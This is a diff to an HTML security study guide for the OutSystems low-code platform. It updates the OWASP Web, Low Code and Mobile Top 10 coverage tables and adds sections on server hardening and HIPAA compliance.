+        <li>Never use <code>'unsafe-inline'</code> or <code>'unsafe-eval'</code> if you can avoid it — for Reactive apps on Platform 11.28+, remove these directives via Factory Configuration.</li>
+        <li>Be specific with domain lists. Never use <code>*</code> unless you have no other option.</li>
+        <li>Set CSP in LifeTime only — do not also configure it in IIS or your web server.</li>
       </ul>
     </section>
 
@@ -1566,63 +1856,126 @@
         <h1>OWASP Top 10 Summary</h1>
       </div>
       <div class="overview-box">
-        <p>Here is a quick reference showing how OutSystems addresses each OWASP risk. Green means OutSystems handles it automatically. Orange means you need to take action.</p>
+        <p>OWASP (Open Web Application Security Project) publishes lists of the most critical security risks for web, mobile, and low-code applications. Here is how OutSystems addresses each one. Green means OutSystems handles it automatically. Orange means you need to take action as a developer.</p>
       </div>
 
-      <h2>OWASP Web Top 10</h2>
+      <div class="tip-box">
+        <span class="tip-icon">💡</span>
+        <p><strong>Auto ✓</strong> = OutSystems handles this automatically. &nbsp; <strong>Dev action</strong> = You need to configure or implement this yourself.</p>
+      </div>
+
+      <h2>OWASP Web Top 10 — 2021</h2>
       <div class="owasp-table">
         <div class="owasp-row owasp-header">
           <span>Risk</span><span>Name</span><span>OutSystems Coverage</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-red">A1</span>
-          <span>Injection</span>
-          <span><span class="status-auto">Auto ✓</span> Escapes user input; Sanitization API for custom code</span>
+          <span>Broken Access Control</span>
+          <span><span class="status-dev">Dev action</span> Use RBAC roles on screens and server actions; validate permissions server-side, not just in UI</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-red">A2</span>
-          <span>Broken Authentication</span>
-          <span><span class="status-auto">Auto ✓</span> Session fixation protection, strong password hashing, brute force protection</span>
+          <span>Cryptographic Failures</span>
+          <span><span class="status-dev">Dev action</span> Enable HTTPS/SSL; encrypt sensitive data at rest using CryptoAPI or database encryption</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-orange">A3</span>
-          <span>Sensitive Data Exposure</span>
-          <span><span class="status-dev">Dev action</span> Enable HTTPS, encrypt data at rest, use CryptoAPI</span>
+          <span>Injection (SQL, HTML, JS)</span>
+          <span><span class="status-auto">Auto ✓</span> Parameterized queries by default; HTML auto-escaped. Use EncodeSql / SanitizeHtml for custom code</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-orange">A4</span>
-          <span>XML External Entities</span>
-          <span><span class="status-auto">Auto ✓</span> Escapes XML parsing in SOAP services</span>
+          <span>Insecure Design</span>
+          <span><span class="status-auto">Auto ✓</span> TrueChange proactively warns of risky patterns at design time; standard code generation uses secure patterns</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-orange">A5</span>
-          <span>Broken Access Control</span>
-          <span><span class="status-dev">Dev action</span> Use RBAC; validate permissions in server actions</span>
+          <span>Security Misconfiguration</span>
+          <span><span class="status-auto">Auto ✓</span> Cloud auto-configured and maintained; self-managed environments need manual hardening</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-yellow">A6</span>
-          <span>Security Misconfiguration</span>
-          <span><span class="status-auto">Auto ✓</span> Cloud auto-configured; self-managed needs manual setup</span>
+          <span>Vulnerable and Outdated Components</span>
+          <span><span class="status-auto">Auto ✓</span> OutSystems continuously monitors for vulnerabilities and applies security patches in Cloud automatically</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-yellow">A7</span>
-          <span>Cross-Site Scripting (XSS)</span>
-          <span><span class="status-auto">Auto ✓</span> HTML escaping; use CSP for extra protection</span>
+          <span>Identification and Authentication Failures</span>
+          <span><span class="status-auto">Auto ✓</span> New session ID on every login; strong password hashing; brute force protection; session timeout</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-yellow">A8</span>
-          <span>Insecure Deserialization</span>
-          <span><span class="status-auto">Auto ✓</span> Anti-tampering JSON deserialization with hash validation</span>
+          <span>Software and Data Integrity Failures</span>
+          <span><span class="status-auto">Auto ✓</span> Built-in anti-tampering JSON deserialization; salted hash validates session data before use</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-blue">A9</span>
-          <span>Known Vulnerable Components</span>
-          <span><span class="status-auto">Auto ✓</span> Continuous monitoring and automatic patching in Cloud</span>
+          <span>Security Logging and Monitoring Failures</span>
+          <span><span class="status-dev">Dev action</span> OutSystems logs all screen and API access automatically; add app-level audit logging for sensitive actions</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-blue">A10</span>
-          <span>Insufficient Logging</span>
-          <span><span class="status-dev">Dev action</span> Implement application logging using Log Message action</span>
+          <span>Server-Side Request Forgery (SSRF)</span>
+          <span><span class="status-dev">Dev action</span> Statically configure external service URLs; validate any dynamic URLs against an allow list before use</span>
+        </div>
+      </div>
+
+      <h2>OWASP Low Code / No Code Top 10 — 2022</h2>
+      <p>OutSystems is a low-code platform, so these risks apply directly to how you build and configure apps:</p>
+      <div class="owasp-table">
+        <div class="owasp-row owasp-header">
+          <span>Risk</span><span>Name</span><span>OutSystems Coverage</span>
+        </div>
+        <div class="owasp-row">
+          <span class="badge-pill badge-red">LC-01</span>
+          <span>Account Impersonation</span>
+          <span><span class="status-auto">Auto ✓</span> App credentials are managed by OutSystems — developers cannot access or change them. Use roles to limit who can publish to production.</span>
+        </div>
+        <div class="owasp-row">
+          <span class="badge-pill badge-red">LC-02</span>
+          <span>Authorization Misuse</span>
+          <span><span class="status-dev">Dev action</span> Each app creates its own auth flows. Use RBAC to restrict screen access; there are no shared connections that bypass auth.</span>
+        </div>
+        <div class="owasp-row">
+          <span class="badge-pill badge-orange">LC-03</span>
+          <span>Data Leakage</span>
+          <span><span class="status-dev">Dev action</span> No data moves without explicit developer code. Restrict developer access to sensitive environments. Use roles to separate privileges.</span>
+        </div>
+        <div class="owasp-row">
+          <span class="badge-pill badge-orange">LC-04</span>
+          <span>Authentication and Secure Communication Failures</span>
+          <span><span class="status-auto">Auto ✓</span> Environments can enforce HTTPS-only; configuration can be applied per app or across all apps via environment settings.</span>
+        </div>
+        <div class="owasp-row">
+          <span class="badge-pill badge-orange">LC-05</span>
+          <span>Security Misconfiguration</span>
+          <span><span class="status-auto">Auto ✓</span> Secure defaults out of the box. Use role-based access to restrict who can change environment-level settings.</span>
+        </div>
+        <div class="owasp-row">
+          <span class="badge-pill badge-yellow">LC-06</span>
+          <span>Injection Handling Failures</span>
+          <span><span class="status-auto">Auto ✓</span> See OWASP A3 above. OutSystems auto-escapes and warns at design time.</span>
+        </div>
+        <div class="owasp-row">
+          <span class="badge-pill badge-yellow">LC-07</span>
+          <span>Vulnerable and Untrusted Components</span>
+          <span><span class="status-dev">Dev action</span> Use OutSystems Forge components; prefer Supported or Trusted components. Review open-source Forge components before use in production.</span>
+        </div>
+        <div class="owasp-row">
+          <span class="badge-pill badge-yellow">LC-08</span>
+          <span>Data and Secret Handling Failures</span>
+          <span><span class="status-dev">Dev action</span> Never hardcode secrets. Use site properties for configuration. Reserve production config changes for high-privilege IT users only.</span>
+        </div>
+        <div class="owasp-row">
+          <span class="badge-pill badge-blue">LC-09</span>
+          <span>Asset Management Failures</span>
+          <span><span class="status-auto">Auto ✓</span> LifeTime gives full visibility over all environments, apps, dependencies, and IT users throughout the entire lifecycle.</span>
+        </div>
+        <div class="owasp-row">
+          <span class="badge-pill badge-blue">LC-10</span>
+          <span>Security Logging and Monitoring Failures</span>
+          <span><span class="status-auto">Auto ✓</span> LifeTime audits IT user actions; Service Center logs all API and screen access. Add app-specific logging with built-in logging actions.</span>
         </div>
       </div>
 
@@ -1634,58 +1987,53 @@
         <div class="owasp-row">
           <span class="badge-pill badge-red">M1</span>
           <span>Improper Platform Usage</span>
-          <span><span class="status-auto">Auto ✓</span> Follows Android/iOS guidelines; AppShield detects emulators</span>
+          <span><span class="status-auto">Auto ✓</span> Generated code follows Android/iOS guidelines; AppShield detects emulators, root, and jailbreak</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-red">M2</span>
           <span>Insecure Data Storage</span>
-          <span><span class="status-dev">Dev action</span> Use Key Store Plugin or Ciphered Local Storage Plugin</span>
+          <span><span class="status-dev">Dev action</span> Use Key Store Plugin or Ciphered Local Storage Plugin for sensitive on-device data. AppShield blocks screen readers and key loggers.</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-orange">M3</span>
           <span>Insecure Communication</span>
-          <span><span class="status-auto">Auto ✓</span> HTTPS enforced; use SSL Pinning Plugin for extra security</span>
+          <span><span class="status-auto">Auto ✓</span> All server communication uses HTTPS. Use SSL Pinning Plugin to prevent man-in-the-middle attacks.</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-orange">M4</span>
           <span>Insecure Authentication</span>
-          <span><span class="status-auto">Auto ✓</span> Encrypted authentication cookies; configurable per environment</span>
+          <span><span class="status-auto">Auto ✓</span> Encrypted authentication cookies; configurable cache, idle, and expiration times per environment</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-yellow">M5</span>
           <span>Insufficient Cryptography</span>
-          <span><span class="status-dev">Dev action</span> Use Key Store Plugin or Ciphered Local Storage Plugin</span>
+          <span><span class="status-dev">Dev action</span> Use Key Store Plugin or Ciphered Local Storage Plugin. AppShield encrypts local storage and prevents copying to another device.</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-yellow">M6</span>
           <span>Insecure Authorization</span>
-          <span><span class="status-dev">Dev action</span> Use RBAC; validate permissions in server actions</span>
+          <span><span class="status-dev">Dev action</span> Use RBAC; always validate permissions in server actions — not just in the mobile UI</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-yellow">M7</span>
           <span>Client Code Quality</span>
-          <span><span class="status-auto">Auto ✓</span> Secure code patterns; AppShield adds code injection protection</span>
+          <span><span class="status-auto">Auto ✓</span> Secure code patterns generated by default; design-time warnings for risky patterns; AppShield adds code injection protection</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-blue">M8</span>
           <span>Code Tampering</span>
-          <span><span class="status-auto">Auto ✓</span> AppShield: root/jailbreak detection, repackaging detection</span>
+          <span><span class="status-auto">Auto ✓</span> AppShield: root/jailbreak detection, repackaging detection, signature verification, debugger blocking</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-blue">M9</span>
           <span>Reverse Engineering</span>
-          <span><span class="status-auto">Auto ✓</span> AppShield: code obfuscation, debugger blocking</span>
+          <span><span class="status-auto">Auto ✓</span> AppShield: code obfuscation, removes debug symbols, blocks debugger and emulator access</span>
         </div>
         <div class="owasp-row">
           <span class="badge-pill badge-blue">M10</span>
           <span>Extraneous Functionality</span>
-          <span><span class="status-auto">Auto ✓</span> Built-in debugging tools reduce need for test code in production</span>
+          <span><span class="status-auto">Auto ✓</span> Built-in debugging tools during development reduce the need for test code that could accidentally reach production</span>
         </div>
-      </div>
-
-      <div class="tip-box">
-        <span class="tip-icon">💡</span>
-        <p><strong>Auto ✓</strong> = OutSystems handles this automatically. &nbsp; <strong>Dev action</strong> = You need to configure or implement this yourself.</p>
       </div>
     </section>
 
@@ -1829,6 +2177,185 @@
           <p>Review and update regularly to avoid known vulnerabilities.</p>
         </div>
       </div>
+    </section>
+
+    <!-- ===== PLATFORM HARDENING ===== -->
+    <section id="hardening" class="content-section">
+      <div class="section-header">
+        <span class="section-icon">🔧</span>
+        <h1>Platform Server Hardening</h1>
+      </div>
+      <div class="overview-box">
+        <p>Hardening means configuring your OutSystems platform securely from day one. A default installation is functional — but a hardened installation is resistant to attackers. This section covers the key steps for self-managed environments.</p>
+      </div>
+
+      <h2>Step 1 — Change Default Admin Passwords Immediately</h2>
+      <p>After a fresh installation, OutSystems creates default administrator accounts. If these are left unchanged, any attacker who knows the default credentials can take full control of your environment. Change them before doing anything else.</p>
+      <ul>
+        <li><strong>Application end-user admin:</strong> Go to <code>&lt;environment address&gt;/Users</code> → select the Administrator user → Change Password.</li>
+        <li><strong>IT user admin (LifeTime):</strong> Go to LifeTime → User Management → select the admin user → edit the password. Also set up a password rotation policy so admin passwords are changed regularly.</li>
+      </ul>
+
+      <h2>Step 2 — Set Up an External Authentication Provider</h2>
+      <p>The built-in username/password authentication is the simplest option, but it means each developer has a separate OutSystems password to manage. Instead, connect OutSystems to your company's identity provider:</p>
+      <ul>
+        <li><strong>Active Directory or LDAP</strong> — for on-premises environments where developers log in with their corporate Windows credentials.</li>
+        <li><strong>SAML 2.0 (via SAML Platform Authentication Forge component)</strong> — allows Service Studio, Service Center, and LifeTime to integrate with commercial IdP providers (Okta, PingFederate, etc.).</li>
+      </ul>
+      <p>When using an external provider, offboarding is automatic — disabling an account in your IdP immediately removes OutSystems access.</p>
+
+      <h2>Step 3 — Install SSL Certificates and Enforce HTTPS</h2>
+      <p>An SSL certificate encrypts all traffic between users and your server. Without it, all data — including passwords and session cookies — travels in plain text. Install a certificate on your application server to activate HTTPS. Once installed:</p>
+      <ul>
+        <li>In OutSystems, go to Service Center and set the <strong>HTTPS enforcement</strong> for your environment (applies to all apps) or per application.</li>
+        <li>Restrict TLS versions — only allow the most recent versions (TLS 1.2 and 1.3). Contact OutSystems support to disable old versions in the Cloud, or configure your web server directly for self-managed environments.</li>
+      </ul>
+      <div class="tip-box">
+        <span class="tip-icon">💡</span>
+        OutSystems Cloud environments come with valid SSL certificates pre-installed using the <code>outsystemsenterprise.com</code> domain. You can — and should — replace this with your own custom domain and certificate.
+      </div>
+
+      <h2>Step 4 — Configure Internal Network Restrictions</h2>
+      <p>Not everything in your app should be publicly accessible. OutSystems lets you mark specific screens, exposed SOAP services, and REST APIs as <strong>internal only</strong> — accessible only from specific IP address ranges (your office network, VPN, etc.).</p>
+      <p>Use this for:</p>
+      <ul>
+        <li>Back-office management screens that only internal staff should reach.</li>
+        <li>Administrative APIs that should never be exposed to the internet.</li>
+        <li>Any screen or service that handles sensitive configuration or reporting.</li>
+      </ul>
+
+      <h2>Step 5 — Set Up Security Headers</h2>
+      <p>Beyond CSP, two additional HTTP response headers add protection against common browser-based attacks. You can configure them using the <strong>Factory Configuration</strong> Forge component in Service Center:</p>
+      <div class="concept-list">
+        <div class="concept-item">
+          <span class="concept-badge badge-blue">X-Frame</span>
+          <div>
+            <strong>X-Frame-Options</strong>
+            <p>Tells the browser whether your app can be embedded inside a <code>&lt;frame&gt;</code>, <code>&lt;iframe&gt;</code>, or <code>&lt;embed&gt;</code> element. Setting this to <code>DENY</code> or <code>SAMEORIGIN</code> prevents <strong>clickjacking attacks</strong> — where an attacker puts your app inside an invisible frame and tricks users into clicking UI elements without knowing it.</p>
+          </div>
+        </div>
+        <div class="concept-item">
+          <span class="concept-badge badge-orange">X-XSS</span>
+          <div>
+            <strong>X-XSS-Protection</strong>
+            <p>Tells older browsers to stop loading a page when they detect a reflected XSS attack. Modern browsers handle this through CSP instead, but this header provides a fallback for older browsers that do not support CSP.</p>
+          </div>
+        </div>
+      </div>
+
+      <h2>Step 6 — Harden Mobile Apps with AppShield</h2>
+      <p>For mobile apps, OutSystems offers <strong>AppShield</strong> — an add-on that builds security protections directly into the compiled app binary. These protections run at the device level, not the server level:</p>
+      <ul>
+        <li><strong>Root and jailbreak detection</strong> — detects if the device has been compromised and can block the app from running on it.</li>
+        <li><strong>Code injection protection</strong> — prevents attackers from injecting code into the running app process.</li>
+        <li><strong>Repackaging detection</strong> — detects if someone has modified the app binary and re-signed it.</li>
+        <li><strong>Screenshot protection and key logger blocking</strong> — prevents malicious software on the device from capturing what the user sees or types.</li>
+        <li><strong>Code obfuscation</strong> — makes reverse engineering the app much harder by renaming and scrambling the internal code.</li>
+      </ul>
+
+      <h2>Encryption at Rest</h2>
+      <p>For sensitive stored data, OutSystems supports:</p>
+      <ul>
+        <li><strong>Database Transparent Data Encryption (TDE)</strong> — encrypts the entire database at the storage level. Even if someone steals the database files, the data is unreadable without the encryption key.</li>
+        <li><strong>Application-level encryption (CryptoAPI Forge component)</strong> — lets you encrypt specific fields in the database using keys you manage. This gives you more control — even database administrators cannot read encrypted field values without the key.</li>
+        <li><strong>Envelope encryption</strong> — uses a data key encrypted with a master key, so different applications can have different encryption keys. This is more secure than a single shared database key.</li>
+      </ul>
+
+      <h2>Best Practices</h2>
+      <ul>
+        <li>Change all default passwords before opening the environment to any users — before development begins, not just before production.</li>
+        <li>Use an external authentication provider for IT users. Never leave the built-in password as the only authentication method for long-term use.</li>
+        <li>Set up a VPN between your OutSystems Cloud and your internal systems so that internal APIs never need to be exposed to the public internet.</li>
+        <li>Review the OutSystems hardening guide for self-managed environments — it includes specific IIS and database configuration steps that are not covered here.</li>
+      </ul>
+    </section>
+
+    <!-- ===== HIPAA COMPLIANCE ===== -->
+    <section id="hipaa" class="content-section">
+      <div class="section-header">
+        <span class="section-icon">🏥</span>
+        <h1>HIPAA Compliance</h1>
+      </div>
+      <div class="overview-box">
+        <p><strong>HIPAA</strong> (Health Insurance Portability and Accountability Act) is a US law that requires healthcare organizations to protect electronic health information (ePHI). If you build healthcare apps with OutSystems, you need to ensure they meet HIPAA requirements.</p>
+      </div>
+
+      <h2>What Is ePHI and Why Does It Matter?</h2>
+      <p>ePHI stands for <strong>Electronic Protected Health Information</strong> — any individually identifiable health data that is stored, transmitted, or processed electronically. Examples include: medical records, diagnoses, prescriptions, billing information, and anything else that connects a person's identity to their health status.</p>
+      <p>HIPAA divides requirements into three types of safeguards: <strong>Technical</strong> (covered here), Administrative (policies and procedures), and Physical (data center and hardware security). OutSystems helps with the technical safeguards.</p>
+
+      <h2>How OutSystems Helps — Technical Safeguards</h2>
+
+      <div class="concept-list">
+        <div class="concept-item">
+          <span class="concept-badge badge-blue">Access</span>
+          <div>
+            <strong>Access Control</strong>
+            <p>HIPAA requires that only authorized people can access ePHI. OutSystems helps with its built-in role-based access control (RBAC) — you can restrict which screens and actions each user role can access. The Users API lets you automate user provisioning and deactivation as employees join, change roles, or leave.</p>
+            <p>Each user in OutSystems gets a unique identifier, making it possible to trace all activity back to a specific person — which is a HIPAA requirement for audit trails.</p>
+          </div>
+        </div>
+        <div class="concept-item">
+          <span class="concept-badge badge-orange">Audit</span>
+          <div>
+            <strong>Audit Controls</strong>
+            <p>HIPAA requires you to log and be able to review who accessed ePHI and when. OutSystems logs every screen access, API call, and database query made by IT users. For end-user actions in your apps, you need to add your own audit trail — use OutSystems logging actions to record sensitive operations and store them in a SIEM (Security Information and Event Management) system of your choice.</p>
+          </div>
+        </div>
+        <div class="concept-item">
+          <span class="concept-badge badge-red">Session</span>
+          <div>
+            <strong>Automatic Logoff</strong>
+            <p>HIPAA requires that sessions terminate automatically after a period of inactivity. OutSystems has a configurable <strong>session timeout</strong> — when a session exceeds the idle time you set, the platform ends it automatically. Set this value appropriate to the sensitivity of the data (shorter for high-risk screens).</p>
+          </div>
+        </div>
+        <div class="concept-item">
+          <span class="concept-badge badge-green">Encrypt</span>
+          <div>
+            <strong>Encryption and Decryption</strong>
+            <p>HIPAA requires ePHI to be encrypted both at rest and in transit. OutSystems supports HTTPS/TLS for data in transit. For data at rest, OutSystems Cloud HIPAA customers get access to the <strong>Cryptographic Services app</strong> — a built-in key management system for encrypting sensitive fields. Self-managed customers can use database TDE or the CryptoAPI Forge component.</p>
+          </div>
+        </div>
+        <div class="concept-item">
+          <span class="concept-badge badge-purple">Auth</span>
+          <div>
+            <strong>Person or Entity Authentication</strong>
+            <p>HIPAA requires that anyone accessing ePHI is verified to be who they claim to be. OutSystems supports multiple strong authentication methods: password, token/OTP (via Google Authenticator), fingerprint/Touch ID, and multi-factor authentication. For enterprise environments, integrate with your company's identity provider (SAML 2.0, Entra ID, Okta) to centralize strong authentication.</p>
+          </div>
+        </div>
+        <div class="concept-item">
+          <span class="concept-badge badge-blue">Failover</span>
+          <div>
+            <strong>Emergency Access (Data Failover)</strong>
+            <p>HIPAA requires that ePHI remains accessible even in emergencies (e.g., a server failure). OutSystems supports standard database failover mechanisms: SQL Server Always-On, database mirroring, and Oracle RAC/Data Guard. As long as the failover system provides a single endpoint and maintains data consistency, OutSystems works with it.</p>
+          </div>
+        </div>
+      </div>
+
+      <h2>The OutSystems Cloud HIPAA Offering</h2>
+      <p>For organizations that need full HIPAA compliance in the cloud, OutSystems offers a dedicated <strong>HIPAA offering on OutSystems Sentry</strong>:</p>
+      <ul>
+        <li>A <strong>Business Associate Agreement (BAA)</strong> — a legal contract confirming that OutSystems is a HIPAA-compliant business associate</li>
+        <li>Access to the <strong>Cryptographic Services app</strong> for protecting PHI at the application level with a managed key system</li>
+        <li><strong>Independent auditor attestation</strong> — third-party verification that OutSystems technology and processes handle PHI correctly</li>
+      </ul>
+      <p>To check if your environment has the HIPAA offering, look for the Cryptography Services app in your environments. If it is not there, contact your OutSystems account manager.</p>
+
+      <div class="example-box">
+        <strong>Example — What you must still do yourself:</strong><br>
+        OutSystems provides the technical tools, but HIPAA also requires you to write and maintain policies: who is allowed to access patient data, what gets audited, how long logs are kept, and what happens if there is a breach. OutSystems cannot write these policies for you — but its tools make it possible to implement and enforce them in your apps.
+      </div>
+
+      <h2>Key Responsibilities Checklist</h2>
+      <ul>
+        <li>Use role-based access control to restrict who can see and modify ePHI — at the screen, action, and data level.</li>
+        <li>Build an audit trail for all sensitive end-user actions involving ePHI and store it in a secure, tamper-resistant log system.</li>
+        <li>Configure session timeout to automatically log out inactive users.</li>
+        <li>Encrypt all ePHI in transit (HTTPS) and at rest (Cryptographic Services or CryptoAPI).</li>
+        <li>Deactivate user accounts immediately when employees leave or change roles.</li>
+        <li>Use strong authentication — at minimum a strong password policy, ideally MFA — for any user who can access ePHI.</li>
+        <li>If on OutSystems Cloud and handling ePHI, ensure you have signed a BAA with OutSystems.</li>
+      </ul>
     </section>
 
   </main>
